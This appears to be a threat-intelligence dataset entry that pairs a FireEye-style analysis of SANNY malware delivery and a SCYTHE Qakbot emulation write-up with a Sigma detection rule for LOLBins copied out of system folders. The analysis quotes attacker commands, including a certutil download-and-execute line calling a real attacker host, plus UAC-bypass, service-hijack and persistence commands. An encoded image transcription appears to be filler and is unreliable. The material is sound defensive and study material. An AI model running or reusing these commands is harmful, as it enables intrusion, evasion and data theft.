line snippet showing the execution of a BAT file download and decoding process using the Microsoft Windows `certutil.exe` utility. It outlines a series of commands where `certutil.exe` is copied to a temporary directory and executed to download an encoded BAT file from a specified URL. The command also includes steps for decoding the file and deleting the original text file after extraction.\nTranscription: |\n  C:\\Windows\\system32\\cmd.exe /q /c copy /Y\n  %windir%\\System32\\certutil.exe %TEMP%\\ct.exe && cd /d\n  %TEMP% && ct -urlcache -split -f\n  http://more.1apps.com/1.txt && ct -decode -f 1.txt\n  1.bat && del /f /q 1.txt && 1.bat\n```\n\nThere were a few interesting observations in the command line:\n\n1. The macro copies the Microsoft Windows `certutil.exe` utility to the `%temp%` directory with the name: `ct.exe`. One of the reasons for this is to evade detection by security products. Recently, FireEye has observed other threat actors using `certutil.exe` for malicious purposes. By renaming `certutil.exe` before execution, the malware authors are attempting to evade simple file-name based heuristic detections.\n2. The malicious BAT file is stored as the contents of a fake PEM encoded SSL certificate (with the BEGIN and END markers) on the Stage 1 URL, as shown in Figure 3. The `certutil.exe` utility is then leveraged to both strip the BEGIN/END markers and decode the Base64 contents of the file. FireEye has not previously observed the malware authors use this technique in past campaigns.\n\n```image\nAlt: Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate\nDescription: The image depicts a text-based representation of a malicious BAT file, formatted to resemble a PEM encoded SSL certificate. It includes the markers 'BEGIN CERTIFICATE' and 'END CERTIFICATE', with the encoded content in between. This format is used to disguise the BAT file to evade detection, and is part of a cyber attack strategy involving the SANNY malware.\nTranscription: |\n  -----BEGIN CERTIFICATE-----\n  QGVjaG9pb2ZmQ0NlcmIxIG5vdCBleGlzdCBleGlzdCB0aGVJVSBTdG9QS1UgSUxFUyh4ODYpJSIg\n  KA0KCWh0dCI6ICJjYWNoZSAtd3d3Lm9hcGVuLm9yZyBtb3RoZXIgYmluZGluZyBhcHBsaWNhdGlv\n  bnMgYnVnLC4gICBidWcgYWNjaGVzIGJla2F1c2UgdGhleSBhcmUgY29tcGxleCBhbmQgdGhleSBh\n  cmUgYm91bmQgdG8gZnJlcXVlbnQgdXBkYXRlcy4gICBIZXJlIGlzIGFuIGV4YW1wbGUgb2YgYSBz\n  aW1wbGUgY2VydGlmaWNhdGUgdGhhdCBjb3VsZCBiZSB1c2VkIGZvciBhIGJyb3dzZXIgcGx1Z2lu\n  ...\n```\n\n*Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate*\n\n### BAT File Analysis\n\nOnce decoded and executed, the BAT file from Stage 1 will download an encoded CAB file from the base URL: `hxxp://more.1apps[.]com/`. The exact file name downloaded is based on the architecture of the operating system.\n\n- For a 32-bit operating system: `hxxp://more.1apps[.]com/2.txt`\n- For a 64-bit operating system: `hxxp://more.1apps[.]com/3.txt`\n\nSimilarly, based on Windows operating system version and architecture, the CAB file is installed using different techniques. For Windows 10, the BAT file uses `rundll32` to invoke the appropriate function from `update.dll` (component inside `setup.cab`).\n\n- For a 32-bit operating system: `rundll32 update.dll _EntryPoint@16`\n- For a 64-bit operating system: `rundll32 update.dll EntryPoint`\n\nFor other versions of Windows, the CAB file is extracted using the legitimate Windows Update Standalone Installer (`wusa.exe`) directly into the system directory:\n\n```image\nAlt: CAB File Installation Code\nDescription: |\n  The image depicts a snippet of code related to the installation of a CAB file using the Windows Update Standalone Installer (wusa.exe). It includes commands for quiet extraction of the CAB file, deletion of the setup file, and other command-line instructions, which are part of a malware delivery method associated with SANNY malware. The specific commands shown are \n  - 'wusa setup.cab /quiet /extract:%windir%\\System32 > nul' \n  - 'del /f /q setup.cab > nul' \n  - 'cliconfg' \n  - 'goto EXIT'.\nTranscription: |\n  plaintext\n  wusa setup.cab /quiet /extract:%windir%\\System32 > nul\n  del /f /q setup.cab > nul\n  cliconfg\n  goto EXIT\n```\n\nThe BAT file also checks for the presence of Kaspersky Lab Antivirus software on the machine. If found, CAB installation is changed accordingly in an attempt to bypass detection:\n\n```image\nAlt: Kaspersky Detection Code\nDescription: The image displays a snippet of code related to the installation process of a CAB file used in SANNY malware. It includes commands for setting a path, expanding the CAB file, deleting the original CAB file, adding a registry entry for the malware to run at startup, and invoking the 'rundll32' command to execute a DLL file. The code is formatted in a monospaced font, indicating its function as a script, and highlights key commands that illustrate the malware's behavior during installation.\nTranscription: |\n  set sPath=%LOCALAPPDATA%\\Microsoft\\Office\n  expand setup.cab -F:ipnet.* %sPath% > nul\n  del /f /q setup.cab > nul\n  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t\n  REG_SZ /d \"rundll32 %sPath%\\ipnet.dll ServiceMain\" /f > nul\n  rundll32 %sPath%\\ipnet.dll ServiceMain\n  goto EXIT\n```\n\n### Stage 2: CAB File Analysis\n\nAs described in the previous section, the BAT file will download the CAB file based on the architecture of the underlying operating system. The rest of the malicious activities are performed by the downloaded CAB file.\n\nThe CAB file contains the following components:\n\n- `install.bat` – BAT file used to deploy and execute the components.\n- `ipnet.dll` – Main component that we refer to as SANNY malware.\n- `ipnet.ini` – Config file used by SANNY malware.\n- `NTWDBLIB.dll` – Performs UAC bypass on Windows 7 (32-bit and 64-bit).\n- `update.dll` – Performs UAC bypass on Windows 10.\n\n`install.bat` will perform the following essential activities:\n\n1. Checks the current execution directory of the BAT file. If it is not the Windows system directory, then it will first copy the necessary components (`ipnet.dll` and `ipnet.ini`) to the Windows system directory before continuing execution:\n\n   ```image\n   Alt: Install.bat Code\n   Description: The image depicts a portion of code from a BAT file used in the SANNY malware delivery method. It includes commands that check if the current execution directory is the Windows system directory and conditionally copy two files, 'ipnet.dll' and 'ipnet.ini', to the System32 directory. The code also contains commands for deleting the original files after the copy operation, indicating the malicious intent of the script.\n   Transcription: |\n     batch\n     echo %~dp0 | findstr /i \"system32\" > nul\n     IF %ERRORLEVEL% EQU 0 (GOTO INSTALL) ELSE (GOTO COPYFILE)\n     \n     :COPYFILE\n     copy /y %~dp0\\ipnet.dll %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.dll > nul\n     \n     copy /y %~dp0\\ipnet.ini %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.ini > nul\n   ```\n\n2. Hijacks a legitimate Windows system service, `COMSysApp` (COM+ System Application) by first stopping this service, and then modifying the appropriate Windows service registry keys to ensure that the malicious `ipnet.dll` will be loaded when the `COMSysApp` service is started:\n\n   ```image\n   Alt: Service Hijacking Code\n   Description: The image displays a code snippet related to the installation and configuration of a Windows service called `COMSysApp`. It includes commands for stopping the service, configuring it to run with a specific executable path (pointing to `svchost.exe`), and adding registry entries to ensure the malicious `ipnet.dll` is used as the service's dynamic link library (DLL). The commands indicate actions taken to hijack the legitimate service for malicious purposes.\n   Transcription: |\n     :INSTALL\n     sc stop COMSysApp > nul\n     sc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\" > nul\n     reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f > nul\n     reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\System32\\ipnet.dll\" /f > nul\n     sc start COMSysApp > nul\n   ```\n\n3. After the hijacked `COMSysApp` service is started, it will delete all remaining components of the CAB file:\n\n   ```image\n   Alt: Component Deletion Code\n   Description: The image displays a segment of code, specifically command-line instructions related to the deletion of certain files in a Windows environment. It includes commands that use the 'del' function to remove files such as 'NTWDBLIB.dll', 'update.dll', 'dummy.dll', and 'uacme.exe' from the system. The output redirection to 'nul' suggests that any output from these commands will be suppressed, indicating a stealthy approach to file deletion, which is often used in malware operations.\n   Transcription: |\n     del /f /q %~dp0\\NTWDBLIB.dll > nul\n     del /f /q %~dp0\\update.dll > nul\n     del /f /q %~dp0\\dummy.dll > nul\n     del /f /q %~dp0\\uacme.exe > nul\n   ```\n\n`ipnet.dll` is the main component inside the CAB file that is used for performing malicious activities. This DLL exports the following two functions:\n\n1. `ServiceMain` – Invoked when the hijacked system service, `COMSysApp`, is started.\n2. `Post` – Used to perform data exfiltration to the command and control (C2) server using FTP protocol.\n\nThe `ServiceMain` function first performs a check to see if it is being run in the context of `svchost.exe` or `rundll32.exe`. If it is being run in the context of `svchost.exe`, then it will first start the system service before proceeding with the malicious activities. If it is being run in the context of `rundll32.exe`, then it performs the following activities:\n\n1. Deletes the module `NTWDBLIB.DLL` from the disk using the following command:\n\n   ```\n   cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL\n   ```\n\n2. Sets the code page on the system to 65001, which corresponds to UTF-8:\n\n   ```\n   cmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f\n   ```\n\n### Command and Control (C2) Communication\n\nSANNY malware uses the FTP protocol as the C2 communication channel.\n\n#### FTP Config File\n\nThe FTP configuration information used by SANNY malware is encoded and stored inside `ipnet.ini`.\n\nThis file is Base64 encoded using the following custom character set: \n`SbVIn=BU/dqNP2kWw0oCrm9xaJ3tZX6OpFc7Asi4lvuhf-TjMLRQ5GKeEHYgD1yz8`\n\nUpon decoding the file, the following credentials can be recovered:\n\n- **FTP Server:** ftp.capnix[.]com\n- **Username:** cnix_21072852\n- **Password:** vlasimir2017\n\nIt then continues to perform the connection to the FTP server decoded from the aforementioned config file, and sets the current directory on the FTP server as `htdocs` using the `FtpSetCurrentDirectoryW` function.\n\n#### System Information Collection\n\nFor reconnaissance purposes, SANNY malware executes commands on the system to collect information, which is sent to the C2 server.\n\nSystem information is gathered from the machine using the following command:\n\n```image\nAlt: System Information Collection Code\nDescription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\nTranscription: The image displays a command line instruction used in the context of malware operation. It shows the command 'cmd /c systeminfo > %temp%\\temp.ini', which is used to collect system information on a computer and redirect the output to a temporary file named 'temp.ini' in the system's temporary directory. This command is relevant to the discussion of SANNY malware's method for gathering reconnaissance data.\n```\n\nThe list of running tasks on the system is gathered by executing the following command:\n\n```image\nAlt: Task List Collection Code\nDescription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\nTranscription: The image depicts a command line instruction used to collect a list of running tasks on a system. The command shown is 'cmd /c tasklist > %temp%\\temp.ini', which indicates that the output of the 'tasklist' command (a list of currently running processes) is redirected to a temporary file named 'temp.ini' located in the system's temporary directory. This is relevant to the SANNY malware's operational procedures for system information collection.\n```\n\n#### C2 Commands\n\nAfter successful connection to the FTP server decoded from the configuration file, the malware searches for a file containing the substring “to everyone” in the `htdocs` directory. This file will contain C2 commands to be executed by the malware.\n\nUpon discovery of the file with the “to everyone” substring, the malware will download the file and then performs actions based on the following command names:\n\n- **chip command:** This command deletes the existing `ipnet.ini` configuration file from the file system and creates a new `ipnet.ini` file with a specified configuration string. The chip commands allows the attacker to migrate malware to a new FTP C2 server. The command has the following syntax:\n\n  ```image\n  Alt: Chip Command Code\n  Description: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  Transcription: The image depicts a command line input related to the SANNY malware's 'chip' command. It shows the syntax for executing the command, which appears to update the FTP server configuration. The command is formatted as 'cmd /c chip <encoded_FTP_config>', where '<encoded_FTP_config>' represents a placeholder for the actual encoded FTP configuration data. This command is part of the malware's command and control (C2) communication process.\n  ```\n\n- **pull command:** This command is used for the purpose of data exfiltration. It has the ability to upload an arbitrary file from the local filesystem to the attacker’s FTP server. The command has the following syntax:\n\n  ```image\n  Alt: Pull Command Code\n  Description: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  Transcription: The image depicts a command syntax related to the SANNY malware, specifically focusing on the 'pull' command used for data exfiltration. The command is presented in a code format, showing how to execute the command using 'cmd /c pull <path of the file>'. This is part of a technical documentation that outlines various commands associated with the malware's command and control (C2) communication.\n  ```\n\n  The uploaded file is compressed and encrypted using the routine described later in the Compression and Encoding Data section.\n\n- **put command:** This command is used to copy an existing file on the system to a new location and delete the file from the original location. The command has the following syntax:\n\n  ```image\n  Alt: Put Command Code\n  Description: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  Transcription: The image depicts a command syntax for the SANNY malware's 'put' command, which is used to copy an existing file to a new location while deleting the original file. The command follows this structure: 'Cmd /c put <new_file_name> <existing_file_name>'. This image is a part of the detailed technical explanation provided in the context regarding malware commands and their functionalities.\n  ```\n\n- **default command:** If the command begins with the substring `cmd /c`, but it is not followed by either of the previous commands (chip, pull, and put), then it directly executes the command on the machine using `WinExec`.\n\n- **/user command:** This command will execute a command on the system as the logged in user. The command duplicates the access token of `explorer.exe` and spawns a process using the following steps:\n\n  1. Enumerates the running processes on the system to search for the `explorer.exe` process and obtain the process ID of `explorer.exe`.\n  2. Obtains the access token for the `explorer.exe` process with the access flags set to `0x000F01FF`.\n  3. Starts the application (defined in the C2 command) on the system by calling the `CreateProcessAsUser` function and using the access token obtained in Step 2.\n\n| **C2 Command**  | **Purpose**                                         |\n| --------------- | --------------------------------------------------- |\n| chip            | Update the FTP server config file                   |\n| pull            | Upload a file from the machine                      |\n| put             | Copy an existing file to a new destination          |\n| /user           | Create a new process with explorer.exe access token |\n| default command | Execute a program on the machine using WinExec()    |\n\n### Compression and Encoding Data\n\nSANNY malware uses an interesting mechanism for compressing the contents of data collected from the system and encoding it before exfiltration. Instead of using an archiving utility, the malware leverages `Shell.Application` COM object and calls the `CopyHere` method of the `IShellDispatch` interface to perform compression as follows:\n\n1. Creates an empty ZIP file with the name: `temp.zip` in the `%temp%` directory.\n2. Writes the first 16 bytes of the PK header to the ZIP file.\n3. Calls the `CopyHere` method of `IShellDispatch` interface to compress the collected data and write to `temp.zip`.\n4. Reads the contents of `temp.zip` to memory.\n5. Deletes `temp.zip` from the disk.\n6. Creates an empty file, `post.txt`, in the `%temp%` directory.\n7. The `temp.zip` file contents are Base64 encoded (using the same custom character set mentioned in the previous FTP Config File section) and written to the file: `%temp%\\post.txt`.\n8. Calls the `FtpPutFileW` function to write the contents of `post.txt` to the remote file with the format: “from <computer_name_timestamp>.txt”\n\n### Execution on Windows 7 and User Account Control (UAC) Bypass\n\n`NTWDBLIB.dll` – This component from the CAB file will be extracted to the `%windir%\\system32` directory. After this, the `cliconfg` command is executed by the BAT file.\n\nThe purpose of this DLL module is to launch the `install.bat` file. The file `cliconfg.exe` is a legitimate Windows binary (SQL Client Configuration Utility), loads the library `NTWDBLIB.dll` upon execution. Placing a malicious copy of `NTWDBLIB.dll` in the same directory as `cliconfg.exe` is a technique known as DLL side-loading, and results in a UAC bypass.\n\n### Execution on Windows 10 and UAC Bypass\n\n`Update.dll` – This component from the CAB file is used to perform UAC bypass on Windows 10. As described in the BAT File Analysis section, if the underlying operating system is Windows 10, then it uses `update.dll` to begin the execution of code instead of invoking the `install.bat` file directly.\n\nThe main actions performed by `update.dll` are as follows:\n\n1. Executes the following commands to setup the Windows registry for UAC bypass:\n\n   ```image\n   Alt: Registry Setup Code\n   Description: The image depicts a series of command line instructions related to Windows registry modifications. It shows three commands that add registry entries to facilitate the execution of a batch file (`install.bat`) within the context of a UAC (User Account Control) bypass for Windows 10. The commands are formatted in a monospaced font and are enclosed in a box, indicating they are part of a technical description in the context of malware delivery methods.\n   Transcription: |\n     plaintext\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d %TEMP%\\install.bat /f\n     cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f\n   ```\n\n2. Leverages a UAC bypass technique that uses the legitimate Windows binary, `fodhelper.exe`, to perform the UAC bypass on Windows 10 so that the `install.bat` file is executed with elevated privileges:\n\n   ```image\n   Alt: UAC Bypass Code\n   Description: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   Transcription: The image displays a command line instruction used in a malware execution context. It includes the command `cmd /c fodhelper && reg delete HKCU\\SOFTWARE\\Classes\\ms-settings /f`, which suggests a process that utilizes `fodhelper` to bypass User Account Control (UAC) on Windows and subsequently deletes a registry key related to `ms-settings`. This is relevant to the discussion of UAC bypass techniques employed by the SANNY malware.\n   ```\n\n3. Creates an additional BAT file, `kill.bat`, in the current directory to delete evidence of the UAC bypass. The BAT file kills the current process and deletes the components `update.dll` and `kill.bat` from the file system:\n\n   ```image\n   Alt: Kill.bat Code\n   Description: The image displays a code snippet that outlines commands for a batch file, specifically a `kill.bat` script used in malware operations. The commands include `taskkill` to terminate the current process, and `del` commands to forcefully delete the `update.dll` and `kill.bat` files. This code is relevant to the discussion of UAC bypass techniques employed by the SANNY malware on Windows systems.\n   Transcription: |\n     plaintext\n     taskkill /PID <pid_of_current_process> /F\n     del /f /q \"<path>\\update.dll\"\n     del /f /q \"<path>\\kill.bat\"\n   ```\n\n### Conclusion\n\nThis activity shows us that the threat actors using SANNY malware are evolving their malware delivery methods, notably by incorporating UAC bypasses and endpoint evasion techniques. By using a multi-stage attack with a modular architecture, the malware authors increase the difficulty of reverse engineering and potentially evade security solutions.\n\nUsers can protect themselves from such attacks by disabling Office macros in their settings and practicing vigilance when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.\n\n### Indicators of Compromise\n\n| **SHA256 Hash**                                                  | **Original Filename**                                            |\n| ---------------------------------------------------------------- | ---------------------------------------------------------------- |\n| b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 | РГНФ 2018-2019.doc                                               |\n| e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 | Copy of communication from Security Council Committee (1718).doc |\n| eb394523df31fc83aefa402f8015c4a46f534c0a1f224151c47e80513ceea46f | 1.bat                                                            |\n| a2e897c03f313a097dc0f3c5245071fbaeee316cfb3f07785932605046697170 | Setup.cab (64-bit)                                               |\n| a3b2c4746f471b4eabc3d91e2d0547c6f3e7a10a92ce119d92fa70a6d7d3a113 | Setup.cab (32-bit)                                               |",
    "sigma_rule": {
      "title": "LOL-Binary Copied From System Directory",
      "id": "f5d19838-41b5-476c-98d8-ba8af4929ee2",
      "related": [
        {
          "id": "fff9d2b7-e11c-4a69-93d3-40ef66189767",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious copy operation that tries to copy a known LOLBIN from system (System32, SysWOW64, WinSxS) directories to another on disk in order to bypass detections based on locations.\n",
      "references": [
        "https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
        "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_tools_cmd": {
          "Image|endswith": "\\cmd.exe",
          "CommandLine|contains": "copy "
        },
        "selection_tools_pwsh": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            "copy-item",
            " copy ",
            "cpi ",
            " cp "
          ]
        },
        "selection_tools_other": [
          {
            "Image|endswith": [
              "\\robocopy.exe",
              "\\xcopy.exe"
            ]
          },
          {
            "OriginalFileName": [
              "robocopy.exe",
              "XCOPY.EXE"
            ]
          }
        ],
        "selection_target_path": {
          "CommandLine|contains": [
            "\\System32",
            "\\SysWOW64",
            "\\WinSxS"
          ]
        },
        "selection_target_lolbin": {
          "CommandLine|contains": [
            "\\bitsadmin.exe",
            "\\calc.exe",
            "\\certutil.exe",
            "\\cmdl32.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "1 of selection_tools_* and all of selection_target_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_copy_system_dir_lolbin.yml",
    "id": "523"
  },
  {
    "url": "https://www.scythe.io/library/threat-emulation-qakbot",
    "markdown": "# Threat Emulation: Qakbot\n\n**Intro**\nWelcome to the July 2022 SCYTHE #ThreatThursday! This edition features an emulation of Qakbot, a piece of malware that is no stranger to the threat intel community. Qakbot, first seen in 2007, is making headlines again due to use by threat actors like Black Basta as a means of initial entry, lateral movement, and persistence.\n\nPublished: 28 Jul 2022\n\n## Intro\n\nWelcome to the July 2022 SCYTHE #ThreatThursday! This edition features an emulation of Qakbot, a piece of malware that is no stranger to the threat intel community. Qakbot, first seen in 2007, is making headlines again due to use by threat actors like Black Basta as a means of initial entry, lateral movement, and persistence.\n\n## Cyber Threat Intelligence\n\n### Profile:\n\nQakbot at its inception was a banking trojan that has been active since 2007. Over time it has evolved into a malware dropper that is commonly used by ransomware threat actors. As a result, detection of Qakbot can be considered a potential precursor to ransomware attacks due to its “malware installation-as-a-service” botnet. Qakbot’s modular nature makes it an appealing tool for threat actors as they can customize or build the payload according to the target of interest. This modularity makes defense a challenge as each Qakbot campaign can look slightly different on a given affected device.\n\nMost recently (since at least July 11th), researchers report Qakbot is using the Windows 7 Calculator executable to infect devices using a technique known as DLL side-loading. Qakbot is spread via emails containing malicious links, documents, or embedded images. The most recent Qakbot emails contain an HTML attachment that downloads a password-protected ZIP file. The password for the ZIP file is displayed on the HTML page. When the user opens the HTML email attachment, the ZIP download is triggered. The ISO file inside the ZIP is mounted when the user double clicks on it. Inside the ISO is a LNK file (link file) disguised as a PDF or other important document. This shortcut file launches the included calc.exe, which sideloads the Qakbot DLL.\n\n### Targets:\n\nAlthough historically known as a banking trojan targeting the financial sector, Qakbot has evolved and expanded its reach. Due to its “malware installation-as-a-service” Qakbot has been seen in multiple countries and across almost all continents—the Americas, Africa, Asia, and Europe.\n\n### Objectives:\n\n- Data theft\n- Credential harvesting\n\n### Capabilities:\n\n- **Reconnaissance**\n  Utilizes process injection to run a series of discovery commands:\n  - `whoami /all`, `arp -a`, `ipconfig /all`, `net view /all`, `netstat -ano`, `net localgroup`\n\n- **Lateral movement**\n  - Windows Management Instrumentation (WMI)\n\n- **Privilege escalation and persistence**\n  - Creation of scheduled tasks\n  - Registry manipulation\n\n- **Credential harvesting**\n  - Attempts to enumerate credentials from multiple locations\n  - Targets browser data (including cookies and browser history)\n\n- **Data exfiltration**\n  - Specifically exfiltrates emails\n\n- **Other payload delivery**\n  - Cobalt Strike\n  - Often used by threat actors to deliver additional payloads or sell access to other threat actors\n\n## Attack\n\nThe automated emulation begins by downloading the ISO file from VFS. This ISO file was built by SCYTHE, but mimics one seen distributed in the wild via a password-protected zip file embedded in an HTML email attachment. For the emulation, we’ve skipped the HTML email attachment and extracting the zip file since these offer little value in control validation.\n\nThe contents of the ISO file can be seen below. Note that all files except the LNK file have the hidden attribute set, so your display may differ.\n\n```image\nAlt: ISO File Contents\nDescription: The image displays a file explorer window showing the contents of a DVD drive (E:). It lists several files including '7533.dll', 'calc.exe', a shortcut labeled 'Report Jul 14 47787', and 'WindowsCodecs.dll'. The date modified and size for each file are also shown, indicating their last modified times and file sizes. This file listing is relevant to the context of the Qakbot threat emulation, showcasing the specific files involved in the attack scenario.\nTranscription: |\n  | Name                | Date modified       | Type                  | Size   |\n  |---------------------|---------------------|-----------------------|--------|\n  | 7533.dll            | 7/26/2022 4:47 PM   | Application extension | 664 KB |\n  | calc                | 11/20/2010 10:25 PM | Application           | 758 KB |\n  | Report Jul 14 47787 | 7/14/2022 8:30 AM   | Shortcut              | 1 KB   |\n  | WindowsCodecs.dll   | 7/26/2022 9:26 AM   | Application extension | 10 KB  |\n```\n\nThe file `calc.exe` is a legitimate calculator executable, but it loads `WindowsCodecs.dll`. Because `WindowsCodecs.dll` is not listed in KnownDLLs, it can be sideloaded. The file `WindowsCodecs.dll` is a generic loader used by Qakbot, likely to add a step in the sideloading infection chain. The DLL was reverse engineered by SCYTHE analysts and a safe-for-distribution version was created.\n\nThe file `7533.dll` is a Qakbot DLL that has been patched at a binary level to not execute any malicious instructions. The Qakbot loader invokes this DLL through `regsvr32.exe`, but oddly the DLL does not export the `DllRegisterServer` function, guaranteeing an error from `regsvr32.exe`. In practice, this error is suppressed because the DLL entry point never returns. Our patched version of the executable calls the `Kernel32.dll` export `Sleep` for two hours and then returns.\n\nSCYTHE chose to patch the existing Qakbot DLL because it offers additional detection opportunities over just running a generic DLL named `7533.dll`. After all, the code only differs by the few bytes that were patched. You can expect more of this in SCYTHE threats where we use patched malware to ensure things are safe for production while ensuring you get maximum detection opportunities.\n\nTo mimic the user clicking on the link file, SCYTHE developers created the file `click-icon.exe` (downloads as `%USERPROFILE%\\Desktop\\not-for-detections.exe`). This executable simulates clicking on the link with the appropriate working directory using the Windows `ShellExecute` API. You should not use this or the `Mount-DiskImage` PowerShell cmdlet for detection engineering purposes.\n\nAfter executing `regsvr32.exe` and loading the malicious DLL (`7533.dll`), the SCYTHE implant executes a number of post-exploitation system recon commands, including:\n- `whoami /all`\n- `cmd /c set`\n- `arp -a`\n- `ipconfig /all`\n- `net view /all`\n- `net share`\n- `route print`\n- `netstat -nao`\n- `net localgroup`\n\nEach of these commands has been observed being executed by Qakbot threat actors. The Qakbot DLL distributed in this campaign is 32-bit, so ideally you’ll want to run this campaign using a 32-bit executable. This has the practical implication of executing the post-exploitation commands from `C:\\windows\\syswow64` rather than from `C:\\windows\\system32`.\n\nMicrosoft reported that Qakbot has recently used the `C:\\datop` directory for staging of data, including the theft of emails. This directory is created in the emulation plan and fake email files are also populated in this directory. The 7-zip standalone command line binary is downloaded and used to archive the fake emails. This zip file is then exfiltrated to the SCYTHE server. Finally, the emulation removes the `C:\\Datop` directory from the filesystem.\n\n## Clean Up Steps\n\nCleanup for this emulation requires the ISO file to be dismounted. This is done using the PowerShell cmdlet `Dismount-Diskimage`. The ISO file and SCYTHE-provided executable (`not-for-detections.exe`) are deleted.\n\nFinally, because the Qakbot DLL has been patched to sleep for two hours, the `regsvr32` process will still be executing on most machines where the emulation is run. A PowerShell command is used to ensure that any `regsvr32` process with `7533.DLL` in the command line is terminated.\n\n## Detection Opportunities\n\nDetection opportunities begin with the execution of `calc.exe` from a non-standard location. This is depicted in Procmon output below, but can also be seen with Sysmon event ID 1 and Security event ID 4688 (when configured).\n\n```image\nAlt: Detection Opportunity\nDescription: The image depicts a snippet from a process monitoring tool (likely Process Monitor) that shows a series of process creation events. It highlights the execution of 'calc.exe' from a non-standard location (E:\temp\tasks) along with other processes like 'cmd.exe' and 'svchost.exe'. Each entry includes a timestamp, the process name, the path from which it was executed, the process ID (PID), and a status indicating success. This output is relevant for understanding potential detection opportunities for malicious activities, specifically in the context of the Qakbot threat emulation discussion.\nTranscription: |\n  1:04:30.9257731 PM   svchost.exe             824    Process Create   C:\\Windows\\SysWOW64\\DllHost.exe    SUCCESS   PID: 7220, Command...\n  1:04:32.0535178 PM   not-for-detections.exe  9540   Process Create   C:\\Windows\\SysWOW64\\cmd.exe        SUCCESS   PID: 7232, Command...\n  1:04:32.0945295 PM   cmd.exe                 4220   Process Create   C:\\Windows\\System32\\Conhost.exe    SUCCESS   PID: 7223, Command...\n  1:04:32.5556748 PM   cmd.exe                 4220   Process Create   E:\\calc.exe                        SUCCESS   PID: 10192, Command...\n  1:04:32.6960944 PM   calc.exe                10192  Process Create   C:\\Windows\\SysWOW64\\regsvr32.exe   SUCCESS   PID: 7024, Command...\n  1:04:32.9383411 PM   services.exe            688    Process Create   C:\\Windows\\System32\\svchost.exe    SUCCESS   PID: 8932, Command...\n```\n\nThis `calc.exe` instance loads `WindowsCodecs.dll`, which should be expected to load from either `C:\\windows\\system32` or `C:\\windows\\syswow64` (depending on the architecture of the target binary, x86 in this case). In this case, it loads from the same folder as `calc.exe` itself (common in DLL sideloading attacks). Note in the graphic below that `WindowsCodecs.dll` is loaded late in execution for `calc.exe` (relative to legitimate DLLs). This can be detected through Sysmon event ID 7 (when configured).\n\n```image\nAlt: DLL Loading\nDescription: The image displays a screenshot from a process monitoring tool (likely Procmon) showing the execution details of `calc.exe`. It lists various DLLs that are loaded during the execution, including `WindowsCodecs.dll`, which is loaded from a non-standard location (E: drive) rather than the expected system directories. Each entry includes timestamps, the operation performed (Load Image), the path of the DLLs, and the status of the operation (SUCCESS), along with their respective image base addresses.\nTranscription: |\n  1:04:32.6191881 PM    calc.exe    10192    Load Image    C:\\Windows\\SysWOW64\\combase.dll    